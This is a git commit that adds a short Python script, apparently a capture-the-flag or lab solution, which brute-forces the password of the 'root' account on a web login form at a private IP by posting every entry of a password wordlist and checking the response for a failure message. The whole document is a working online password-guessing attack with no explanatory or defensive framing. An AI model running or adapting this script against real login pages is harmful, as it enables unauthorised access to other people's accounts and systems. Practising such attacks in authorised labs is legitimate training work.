d7d4c5823bbdc03343de83b45bb554dcf1495b96
Skickar <40251293+skickar@users.noreply.github.com>
2022-02-02 00:13:21 -0700

    Solution: brute force password with known username

---
+++ BrutePassword.py
@@ -0,0 +1,22 @@
+import requests
+import random
+
+adminName = "root"
+passwordList = "bigpasswordlist.txt"
+requestURL = 'http://192.168.59.192/login'
+
+with open(passwordList, 'r') as f:
+    names = [name.strip() for name in f.readlines() if name.strip()]
+
+random.shuffle(names)
+
+wrong = True
+while wrong:
+    for name in names:
+        print("Trying username {} with password {}".format(adminName, name))
+        r = requests.post(requestURL, data={"username":adminName, "password":name})
+        if "<p class=is-warning>Wrong Password!</p>" not in r.text and 'Error processing request' not in r.text:
+            wrong = False
+            break
+
+print("Found credentials: Username {} with password {} name:".format(adminName, name))
